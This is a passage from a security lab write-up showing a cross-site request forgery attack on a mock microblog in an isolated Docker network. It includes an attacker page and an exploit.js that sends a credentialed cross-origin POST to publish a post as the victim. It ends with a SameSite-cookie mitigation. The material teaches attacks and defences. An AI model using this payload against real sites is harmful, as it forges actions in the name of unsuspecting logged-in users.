attack on our artificial microblog webapp.

## Setup

***

Our network this time around again uses our small mock webapp

```yaml
version: '3'

services:
  microblog:
    image: # private image
    container_name: microblog
    ports:
      - "8080:80"
    networks:
      channel:
        ipv4_address: 10.0.0.2
        
  alice:
    image: # private image
    container_name: alice
    tty: true
    shm_size: '1gb'
    sysctls:
        - net.ipv6.conf.all.disable_ipv6=1
    networks:
      channel:
        ipv4_address: 10.0.0.3
        
  mallory:
      image: nginx
      container_name: mallory
      tty: true
      ports:
        - "8081:80"
      volumes:
          - .:/usr/share/nginx/html:ro
      networks:
        channel:
          ipv4_address: 10.0.0.4
      
  wireshark:
    image: # private image
    container_name: wireshark
    tty: true
    network_mode: service:alice

networks:
  channel:
    driver: bridge
    ipam:
      config:
        - subnet: 10.0.0.0/24
```

## Overview

***

The high-level overview of CSRF is using cookies in a way not intended in order to hijack
session information or possibly send requests which were unsolicited by the user. In
other words.

1. the attacker creates a malicious webpage embedding a piece of javascript code that performs a cross-domain ajax request with credentials to the vulnerable website
2. the victim logs in to the vulnerable website and later on browses the attacker's malicious webpage executing the request with the victim's credentials

The exploit then takes advantage of vulnerabilities present in cross-origin requests.
More precisely, it allows a malicious actor to perform unexpected and unwanted actions
for an authenticated target.

It is facilitated due to [Cross-origin resource sharing](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing)
which allows resources on a web page to be requested from
a different domain than the one the content was first served.

We simulate Alice navigating to Mallory's site using [Puppeteer](https://github.com/puppeteer/puppeteer)

```javascript
const puppeteer = require('puppeteer');

const TIMEOUT = 3000;
const ALICE = "http://10.0.0.2/";
const MALLORY = "http://10.0.0.4/";

const credentials = {
    'email': 'alice@example.com',
    'password': 'pass4alice!'
};

(async () => {
    let browser = await puppeteer.launch({
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--enable-logging', '--v=1'
            ]
    });
    let page = await browser.newPage();
    console.log('Alice visits Microblog homepage');
    await page.goto(ALICE);
    console.log('Alice logs in Microblog');
    await page.evaluate(async (credentials) => {
        let form = new FormData();
        for (let key in credentials){
             form.append(key, credentials[key]);
        }
        await fetch("/signin.php", {
            method: "POST",
            body: form,
        });
    }, credentials);
    await new Promise(function(resolve, reject){
        setTimeout(function(){ resolve(); }, TIMEOUT);
    });
    console.log('Alice visits Mallory\'s homepage');
    await page.goto(MALLORY);
    await new Promise(function(resolve, reject){
        setTimeout(function(){ resolve(); }, TIMEOUT);
    });
    await page.close();
    await browser.close();
})();
```

## The Attack

***

Mallory simply needs to host a web server does the desirable action for an authenticated user which visits their webpage.
Suppose Mallory wants to post *Mallory is a trustworthy person!* in place of any authenticated user which
visits this page, the simplest way to achieve this would be to include a js script which does the
corresponding request. The page could be as simple as

```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>Mallory's home!</title>
  </head>
  <body>
     <p>Thank you!</p>
     <script src="exploit.js"></script>
  </body>
</html>
```

From our investigation in the [incomplete mediation]()
exercise, we know exectly what the request we want looks like.

```javascript
const MICROBLOG = "10.0.0.2";
const PROTOCOL = "http";
const HOST = "10.0.0.2";
const PORT = "8080";
const BASE = PROTOCOL + "://" + MICROBLOG;

var req = BASE + "/post.php";

 fetch(req, {
    method: "POST",
    credentials: "include",
   headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Connection': 'keep-alive'
    },
    body: "msg=Mallory+is+a+trustworthy+person!" // body data type must match "Content-Type" header
 });
```

now when Alice "navigates" to Mallory's page while logged in

```
$ docker exec alice node /app/browse.js
```

we see in our microblog a post which says *Mallory is a trustworthy person!* under her name
as we expected.

## Conclusions

***

OWASP publishes a [CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
but one way to help mitigate the attack we use here is setting the `SameSite` flag on the
authentication cookie so it cannot be used from an uninteded third-party site.

When you're done, don't forget to [clean up](/crypto/2020/10/08/05-lab.html#docker-cleanup)
after Docker.
